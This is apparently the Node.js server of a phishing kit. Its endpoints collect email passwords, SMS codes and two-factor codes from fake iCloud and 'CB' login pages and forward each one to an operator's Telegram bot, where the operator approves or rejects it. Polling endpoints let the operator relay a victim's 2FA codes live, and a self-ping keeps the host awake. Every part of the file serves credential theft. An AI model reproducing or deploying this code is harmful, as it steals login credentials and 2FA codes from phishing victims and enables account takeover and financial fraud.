// server.js (merged)
console.log("📦 Starting combined server.js...");

const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fetch = require("node-fetch");
const {
  sendApprovalRequest,
  sendApprovalRequestGeneric,
  sendApprovalRequestSMS,
  sendApprovalRequestPage,
  sendLoginTelegram,
  send2FACode
} = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// -----------------
// Store pending approvals
// -----------------
const pendingUsers = {};      // email/password login
const pendingCodes = {};      // SMS codes
const pendingGeneric = {};    // generic codes
const pendingPage = {};       // iCloud page logins
const pendingApprovals = {};  // CB login approvals
const pending2FA = {};        // 2FA approvals

// -----------------
// User ID counter (assigns a unique ID per IP)
// -----------------
let userCounter = 0;
const userIds = {}; // ip -> id

// -----------------
// Health check
// -----------------
app.get("/", (req, res) => {
  res.send("✅ Combined Server is running.");
});

// -----------------
// Get or assign a user ID by IP
// -----------------
app.post("/get-user-id", (req, res) => {
  const ip = req.body.ip || "unknown";
  if (!userIds[ip]) {
    userCounter++;
    userIds[ip] = userCounter;
  }
  res.json({ userId: userIds[ip] });
});

// -----------------
// Email/Password Login (unchanged)
// -----------------
app.post("/login", (req, res) => {
  const email = (req.body.email || "").trim().toLowerCase();
  const password = req.body.password;

  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });

  pendingUsers[email] = { password, status: "pending" };
  console.log(`📥 Login Received: ${email}`);

  sendApprovalRequest(email, password);
  res.json({ success: true });
});

// -----------------
// Generic code submission (unchanged)
// -----------------
app.post("/generic-login", (req, res) => {
  const identifier = (req.body.identifier || "").trim();
  if (!identifier) return res.status(400).json({ success: false, message: "Identifier required" });

  pendingGeneric[identifier] = { status: "pending" };
  console.log(`📥 Generic Identifier Received: ${identifier}`);

  sendApprovalRequestGeneric(identifier);
  res.json({ success: true });
});

// -----------------
// ✅ FIXED: iCloud SMS Login
// Now accepts full formatted message from frontend
// -----------------
app.post("/sms-login", async (req, res) => {
  const code = (req.body.code || "").trim();
  const message = req.body.message;

  if (!code) return res.status(400).json({ success: false, message: "Code required" });

  pendingCodes[code] = { status: "pending" };
  console.log(`📥 SMS Code Received: ${code}`);

  try {
    await sendApprovalRequestSMS(code, message);
  } catch (err) {
    console.error("❌ Failed to send SMS Telegram message:", err);
  }

  res.json({ success: true });
});

// -----------------
// ✅ FIXED: iCloud Page Login
// Now accepts full formatted message from frontend
// -----------------
app.post("/page-login", async (req, res) => {
  const email = (req.body.email || "").trim().toLowerCase();
  const password = req.body.password;
  const message = req.body.message;

  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });

  pendingPage[email] = { password, status: "pending" };
  console.log(`📥 iCloud Page Login Received: ${email}`);

  try {
    await sendApprovalRequestPage(email, password, message);
  } catch (err) {
    console.error("❌ Failed to send Page Telegram message:", err);
  }

  res.json({ success: true });
});

// -----------------
// ✅ FIXED: CB Login
// Now accepts full formatted message from frontend
// -----------------
app.post("/send-login", async (req, res) => {
  const { email, password, region, device, message } = req.body;
  if (!email || !password) return res.status(400).json({ error: "Missing email or password" });

  pendingApprovals[email] = { status: "pending", password, region, device };
  console.log(`📥 CB Login received: ${email}`);

  try {
    await sendLoginTelegram(email, message);
  } catch (err) {
    console.error("❌ Failed to send CB Login Telegram message:", err);
  }

  res.json({ status: "ok" });
});

// -----------------
// 2FA: Submit code (called by frontend)
// -----------------
app.post("/api/submit-2fa", async (req, res) => {
  const { message, requestId } = req.body;

  if (!message || !requestId) {
    return res.status(400).json({ error: "Missing message or requestId" });
  }

  pending2FA[requestId] = { status: "pending", message };
  console.log(`📥 2FA Request received: ${requestId}`);

  try {
    const { bot } = require("./bot");
    await bot.sendMessage(
      process.env.ADMIN_CHAT_ID || process.env.CHAT_ID,
      message,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ Approve", callback_data: `2fa_approve|${requestId}` },
              { text: "❌ Reject",  callback_data: `2fa_reject|${requestId}` }
            ]
          ]
        }
      }
    );
    res.json({ status: "pending", requestId });
  } catch (err) {
    console.error("❌ Failed to send 2FA Telegram message:", err);
    res.status(500).json({ error: "Failed to send Telegram message" });
  }
});

// -----------------
// 2FA: Poll approval status
// -----------------
app.get("/api/approval-status/:requestId", (req, res) => {
  const { requestId } = req.params;
  const entry = pending2FA[requestId];

  if (!entry) return res.json({ status: "pending" });
  res.json({ status: entry.status });
});

// -----------------
// 2FA: Update approval from bot callback
// -----------------
app.post("/api/update-2fa-status", (req, res) => {
  const { requestId, status } = req.body;
  if (!requestId || !status) return res.status(400).json({ error: "Missing requestId or status" });

  if (pending2FA[requestId]) {
    pending2FA[requestId].status = status;
    console.log(`✅ 2FA status updated: ${requestId} → ${status}`);
    return res.json({ ok: true });
  }

  res.json({ ok: false, message: "requestId not found" });
});

// -----------------
// Legacy: verify-code endpoint (keyboard-based 2FA)
// -----------------
app.post("/api/verify-code", (req, res) => {
  const { code, chatId } = req.body;

  if (!code || !chatId) {
    return res.status(400).json({ message: "Code and chatId are required." });
  }

  if (code.length >= 6 && code.length <= 8) {
    send2FACode(code, chatId);
    console.log(`📥 2FA Code sent to chatId: ${chatId}`);
    res.status(200).json({ message: "Code sent to Telegram." });
  } else {
    res.status(400).json({ message: "Invalid code length. Must be 6–8 characters." });
  }
});

// -----------------
// Check status (GET) — all types
// -----------------
app.get("/check-status", (req, res) => {
  const identifier = (req.query.identifier || "").trim();
  if (pendingUsers[identifier])     return res.json({ status: pendingUsers[identifier].status });
  if (pendingCodes[identifier])     return res.json({ status: pendingCodes[identifier].status });
  if (pendingGeneric[identifier])   return res.json({ status: pendingGeneric[identifier].status });
  if (pendingPage[identifier])      return res.json({ status: pendingPage[identifier].status });
  if (pendingApprovals[identifier]) return res.json({ status: pendingApprovals[identifier].status });
  res.json({ status: "unknown" });
});

// Check status (POST) — CB login polling
app.post("/check-status", (req, res) => {
  const { email } = req.body;
  if (!email || !pendingApprovals[email]) return res.json({ status: "pending" });
  res.json({ status: pendingApprovals[email].status });
});

// -----------------
// Update approval status (called by bot for non-2FA flows)
// -----------------
app.post("/update-status", (req, res) => {
  const identifier = (req.body.identifier || req.body.email || "").trim();
  const status = req.body.status;

  console.log(`📬 Update Status Received: ${identifier}, ${status}`);

  if (pendingUsers[identifier]) {
    pendingUsers[identifier].status = status;
  } else if (pendingCodes[identifier]) {
    pendingCodes[identifier].status = status;
  } else if (pendingGeneric[identifier]) {
    pendingGeneric[identifier].status = status;
  } else if (pendingPage[identifier]) {
    pendingPage[identifier].status = status;
  } else if (pendingApprovals[identifier]) {
    pendingApprovals[identifier].status = status;
  } else {
    return res.json({ ok: false, message: "Identifier not found" });
  }

  console.log(`✅ Status updated for: ${identifier}`);
  res.json({ ok: true });
});

// -----------------
// Self-ping to stay awake on Render
// -----------------
setInterval(() => {
  const url = process.env.APP_URL;
  if (url) {
    fetch(url).then(() => console.log("🔁 Pinged self")).catch(err => console.error("⚠️ Ping failed:", err));
  }
}, 30 * 1000);

// -----------------
// Start server
// -----------------
app.listen(PORT, () => {
  console.log(`✅ Combined server running at port ${PORT}`);
});
